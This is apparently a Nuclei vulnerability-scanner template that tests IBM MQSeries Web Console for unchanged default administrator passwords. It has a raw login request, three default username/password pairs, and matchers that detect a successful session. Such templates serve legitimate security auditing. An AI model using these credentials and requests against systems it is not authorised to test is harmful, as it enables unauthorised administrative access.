id: ibm-mqseries-default-login

info:
  name: IBM MQSeries Web Console 默认口令登录（弱口令）
  author: righettod
  severity: high
  description: 该模板通过尝试 IBM MQSeries Web Console 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/ibm-messaging/mq-container/blob/master/etc/mqm/mq.htpasswd
    - https://vulners.com/nessus/IBM_MQ_DEFAULT_CREDENTIALS.NASL
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 3
  tags: ibm,default-login,vuln

http:
  - raw:
      - |
        POST /ibmmq/console/j_security_check HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}/ibmmq/console/login.html

        j_username={{username}}&j_password={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin
        - app
        - mqadmin
      password:
        - passw0rd
        - passw0rd
        - mqadmin

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "LtpaToken2_"

      - type: status
        status:
          - 302
